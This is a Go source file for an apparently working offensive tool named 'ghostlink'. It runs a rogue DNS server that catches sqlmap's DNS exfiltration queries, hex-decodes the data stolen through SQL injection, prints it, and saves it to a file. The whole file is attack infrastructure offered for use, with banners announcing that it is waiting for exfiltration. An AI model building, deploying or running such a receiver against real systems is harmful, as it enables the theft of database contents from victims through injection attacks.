package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"
)

const banner = `
   _______                 __  ___       __  
  / ____/ /_  ____  _____/ /_/ (_)____  / /__
 / / __/ __ \/ __ \/ ___/ __/ / / __ \/ //_/ 
/ /_/ / / / / /_/ (__  ) /_/ / / / / / ,<    
\____/_/ /_/\____/____/\__/_/_/_/ /_/_/|_|   
   sqlmap bridge
`

func main() {
	addr := flag.String("addr", "0.0.0.0:53", "DNS listen address")
	output := flag.String("output", "", "save exfiltrated data to file")
	flag.Parse()

	fmt.Print(banner)
	fmt.Printf("[*] ghostlink <> sqlmap bridge\n")
	fmt.Printf("[*] listening on %s\n", *addr)
	fmt.Println("[*] waiting for sqlmap DNS exfiltration queries...")

	var outFile *os.File
	if *output != "" {
		var err error
		outFile, err = os.Create(*output)
		if err != nil {
			log.Fatalf("output file: %v", err)
		}
		defer outFile.Close()
	}

	udpAddr, err := net.ResolveUDPAddr("udp", *addr)
	if err != nil {
		log.Fatalf("resolve: %v", err)
	}
	conn, err := net.ListenUDP("udp", udpAddr)
	if err != nil {
		log.Fatalf("listen: %v (try sudo for port 53)", err)
	}
	defer conn.Close()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		buf := make([]byte, 1500)
		for {
			n, remote, err := conn.ReadFromUDP(buf)
			if err != nil {
				continue
			}
			go handleSQLMapQuery(conn, remote, buf[:n], outFile)
		}
	}()

	<-sigCh
	fmt.Println("\n[*] shutting down...")
}

func handleSQLMapQuery(conn *net.UDPConn, remote *net.UDPAddr, raw []byte, outFile *os.File) {
	if len(raw) < 12 {
		return
	}

	qdCount := int(raw[4])<<8 | int(raw[5])
	if qdCount == 0 {
		return
	}

	labels := extractLabels(raw, 12)
	if len(labels) == 0 {
		return
	}

	fullName := strings.Join(labels, ".")

	data, decoded := tryDecodeSQLExtract(fullName)
	if !decoded || len(data) == 0 {
		return
	}

	timestamp := time.Now().Format("15:04:05")
	fmt.Printf("\n[%s] [%s] %s\n", timestamp, remote.IP, data)

	if outFile != nil {
		outFile.WriteString(data + "\n")
	}

	resp := buildDNSResponse(raw)
	conn.WriteToUDP(resp, remote)
}

func extractLabels(raw []byte, offset int) []string {
	if offset >= len(raw) {
		return nil
	}

	var labels []string
	pos := offset
	for pos < len(raw) {
		labelLen := int(raw[pos])
		if labelLen == 0 {
			break
		}
		if labelLen&0xC0 == 0xC0 {
			ptr := int(uint16(raw[pos])<<8|uint16(raw[pos+1])) & 0x3FFF
			extra := extractLabels(raw, ptr)
			labels = append(labels, extra...)
			pos += 2
			break
		}
		pos++
		if pos+labelLen > len(raw) {
			break
		}
		labels = append(labels, string(raw[pos:pos+labelLen]))
		pos += labelLen
	}

	return labels
}

func tryDecodeSQLExtract(fqdn string) (string, bool) {
	parts := strings.Split(fqdn, ".")
	if len(parts) < 2 {
		return "", false
	}

	var chunks []string
	for _, p := range parts {
		if len(p) == 0 {
			continue
		}
		if strings.HasPrefix(strings.ToLower(p), "ns") ||
			strings.HasPrefix(strings.ToLower(p), "dns") ||
			strings.Contains(strings.ToLower(p), "sqlmap") {
			break
		}
		chunks = append(chunks, p)
	}

	if len(chunks) == 0 {
		return "", false
	}

	hexStr := strings.Join(chunks, "")

	if strings.HasPrefix(hexStr, ".") {
		hexStr = hexStr[1:]
	}

	data := make([]byte, 0)
	for _, ch := range chunks {
		padded := ch
		if len(padded)%2 != 0 {
			continue
		}
		decoded, err := hex.DecodeString(padded)
		if err == nil && len(decoded) > 0 {
			data = append(data, decoded...)
		}
	}

	if len(data) > 0 {
		return string(data), true
	}

	fullDecoded, err := hex.DecodeString(strings.Join(chunks, ""))
	if err == nil && len(fullDecoded) > 0 {
		return string(fullDecoded), true
	}

	result := strings.Join(chunks, "")
	if len(result) > 3 {
		return result, true
	}

	return "", false
}

func buildDNSResponse(query []byte) []byte {
	if len(query) < 12 {
		return nil
	}

	resp := make([]byte, len(query))
	copy(resp, query)

	txID := (uint16(query[0]) << 8) | uint16(query[1])
	resp[0] = byte(txID >> 8)
	resp[1] = byte(txID & 0xFF)

	resp[2] = 0x81
	resp[3] = 0x80

	resp[6] = 0x00
	resp[7] = 0x00

	return resp[:len(query)]
}
